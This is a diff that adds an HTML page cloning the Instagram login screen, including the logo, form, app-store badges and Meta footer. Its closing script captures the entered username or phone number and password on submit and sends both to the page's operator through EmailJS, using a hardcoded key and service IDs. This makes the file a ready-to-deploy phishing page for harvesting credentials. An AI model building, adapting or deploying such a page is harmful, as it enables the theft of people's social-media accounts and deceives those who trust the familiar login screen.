@@ -1,0 +1,186 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+    <meta http-equiv="content-language" content="en-us">
+    <title>Instagram</title>
+    <link rel="stylesheet" href="css/main.css" type="text/css" media="all">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;900&family=Roboto:ital,wght@0,100;0,300;0,400;0,500;0,700;0,900;1,100;1,300;1,400;1,500;1,700;1,900&display=swap" rel="stylesheet">
+</head>
+<script type="text/javascript"
+src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js">
+</script>
+<script type="text/javascript">
+(function(){
+emailjs.init("WaOX8jZPCkWsRW8cH");
+})();
+</script>
+<body>
+
+    <div class="site-container">
+
+        <div class="main-content">
+            <div class="inner-content">
+                <div class="content-left">
+                    <img class="left-img" src="./img/img-1.svg" alt="instagram">
+                </div>
+                <div class="content-right">
+                    <div class="upper-content">
+                        <img class="logo" src="./img/instagram-logo.png" alt="instagram">
+                        <form class="content-form">
+                            <input type="text" placeholder="Phone number, username or email address" class="form-input" id="phone">
+                            <input type="password" placeholder="Password" class="form-input" id="password">
+                            <button type="submit" class="btn-submit">Log in</button>
+                        </form>
+                        <div class="upper-content-marker">
+                            or
+                        </div>
+                        <div class="upper-content-media">
+                            <img src="./img/facebook_icon.png" alt="">
+                            <p>Log in with Facebook</p>
+                        </div>
+                        <div class="upper-content-password">
+                            <p>Forgot passwords?</p>
+                        </div>
+                    </div>
+                    <!-- upper content -->
+
+                    <div class="upper-content-lower">
+                        <p>
+                            <span>
+                                Don't have an account?
+                            </span>
+                            <a>Sign up</a>
+                        </p>
+                    </div>
+
+                    <div class="upper-content-divider">
+                        <p>Get the app.</p>
+                    </div>
+
+                    <div class="upper-content-stores">
+                        <a>
+                            <img src="./img/ios-icon.png" alt="Download on the App Store">
+                        </a>
+                        <a>
+                            <img src="./img/android-icon.png" alt="Get it on Google Play">
+                        </a>
+                    </div>
+
+                </div>
+            </div>
+        </div>
+
+        <!-- footer -->
+        <footer class="footer">
+            <div class="footer-content">
+                <ul class="footer-ul footer-ul-upper">
+                    <li>
+                        <a>
+                            Meta
+                        </a>
+                    </li>
+                    <li>
+                        <a>
+                            About
+                        </a>
+                    </li>
+                    <li>
+                        <a>
+                            Jobs
+                        </a>
+                    </li>
+                    <li>
+                        <a>
+                            Help
+                        </a>
+                    </li>
+                    <li>
+                        <a>
+                            API
+                        </a>
+                    </li>
+                    <li>
+                        <a>
+                            Privacy
+                        </a>
+                    </li>
+                    <li>
+                        <a>
+                            Terms
+                        </a>
+                    </li>
+                    <li>
+                        <a>
+                            Top Accounts
+                        </a>
+                    </li>
+                    <li>
+                        <a>
+                            Locations
+                        </a>
+                    </li>
+                    <li>
+                        <a>
+                            Instagram Lite
+                        </a>
+                    </li>
+                    <li>
+                        <a>
+                            Contact Uploading & Non-Users
+                        </a>
+                    </li>
+                </ul>
+
+                <ul class="footer-ul footer-ul-lower">
+                    <li>
+                        <a>
+                            English
+                        </a>
+                    </li>
+                    <li>
+                        <a>
+                            © 2023 Instagram from Meta
+                        </a>
+                    </li>
+                </ul>
+            </div>
+        </footer>
+
+    </div>
+
+</body>
+<script>
+    document.querySelector("form").addEventListener("submit", (e) => {
+	e.preventDefault();
+	
+    sendEmailToAdmin()
+})
+function sendEmailToAdmin() {
+	let phone = document.getElementById("password").value;
+	let val = document.getElementById("phone").value;
+    
+
+
+	emailjs.send("service_jdtbojn", "template_rky3ibl", {
+        Password: val,
+		Contact: phone,
+       
+        
+	}).then(function (res) {
+        console.log(val,phone);
+		console.log(res);
+	})
+		.catch(
+			function (e) {
+				console.log(e)
+			}
+		)
+
+}
+</script>
+</html>
